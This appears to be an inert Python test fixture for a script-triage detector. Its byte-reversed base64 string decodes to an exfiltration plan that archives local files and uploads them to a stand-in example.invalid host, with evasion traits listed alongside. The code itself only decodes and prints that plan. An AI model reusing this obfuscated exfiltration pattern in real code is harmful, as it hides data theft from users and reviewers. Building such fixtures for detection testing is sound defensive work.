# configuration reconstruction
#!/usr/bin/env python3
# Huntress Script Triage -- inert static-analysis fixture (cpython3)
import base64
import io
import os

MATERIAL_85fb7476 = "cGl6LmJlMjU4ODgzN2YtZWhjYWMvYmFMc3NlcnRudUgvYXRhRG1hcmdvclAvOkM9aHRhcF9ldmloY3JhfGRhb2xwdS9kaWxhdm5pLmVscG1heGUuYmUyNTg4ODM3Zi8vOnNwdHRoPWxydV9kYW9scHV8YmUyNTg4ODM3Zi1uZ2lhcG1hYz1kaV9uZ2lhcG1hY3xyb3NzZWNlZGVycF8yM2xsZG51cj1uaWFoY19zd29kbml3fHJpZGVub19yZWxsYXRzbml5cD1yZWlycmFjfG5vaXRjZXJpZG5pX2FkYm1hbD1ub2l0YWNzdWZib3xoY3RhcHNpZF95cmFub2l0Y2lkPXhhdG55c3wxPXRudW9jX2VnYXRzfHlkb2JfdHNldXFlcl9iaWxscnU9cmV0cGFkYXxldG9tZXJfdGltc25hcnQsZXZpaGNyYV9lZG9jbmUsbGFjb2xfdGNlbGxvYz1zcGV0c3wyPXY="
CODEC_85fb7476 = "urlsafe_base64|reverse_bytes|"

def load_85fb7476():
    return base64.urlsafe_b64decode(MATERIAL_85fb7476)

def decode_85fb7476(EnCoDeD_Bytes):
    return bytes(reversed(EnCoDeD_Bytes))

def recover_85fb7476():
    NeUtRaL = os.environ.get("HUNTRESS_FIXTURE_CONTEXT", "host")
    StAtE = "decode"
    while StAtE != "done":
        if StAtE == "decode":
            DeCoDeD_Bytes = decode_85fb7476(load_85fb7476())
            StAtE = "done"
    DeScRiPtOr_Text = DeCoDeD_Bytes.decode("ascii", "strict")
    return DeScRiPtOr_Text

def inspect_85fb7476():
    return recover_85fb7476()

def surface_85fb7476():
    routes = {"selected": lambda: ("dictionary_dispatch", "lambda_indirection", "pyinstaller_onedir", "rundll32_predecessor")}
    return routes["selected"]()

def obfuscation_85fb7476():
    recover = lambda value: value
    return recover("lambda_indirection")

def plan_85fb7476():
    fields = dict(item.split("=", 1) for item in inspect_85fb7476().split("|"))
    analysis_surface = surface_85fb7476()
    obfuscation_surface = obfuscation_85fb7476()
    operation_plan = ("urllib_request_body", fields["archive_path"], fields["upload_url"])
    return operation_plan + (analysis_surface, obfuscation_surface)

if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
    print(inspect_85fb7476())

# reconstruction complete